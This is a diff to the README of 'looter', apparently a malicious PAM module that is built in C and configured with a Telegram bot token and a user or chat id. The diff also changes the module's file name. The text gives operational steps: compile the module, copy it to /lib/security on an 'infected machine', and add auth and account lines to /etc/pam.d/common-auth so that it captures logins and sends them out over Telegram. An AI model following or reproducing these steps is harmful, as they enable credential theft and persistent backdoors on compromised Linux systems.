@@ -8,7 +8,7 @@ Now with this C version, you compile it on your machine and send it to the infec
 * libpam0g-dev
 
 # Configure
-Edit the `looter.c` and add your telegram bot token and your user id.
+Edit the `looter.c` and add your telegram bot token and either your user id or chat id.
 
 # Compiling
 ```bash
@@ -16,7 +16,7 @@ make
 ```
 
 # Usage
-Copy the `looter.so` to the infected machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
+Copy the `module.so` to the infected machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
 ```
 auth optional module.so
 account optional module.so
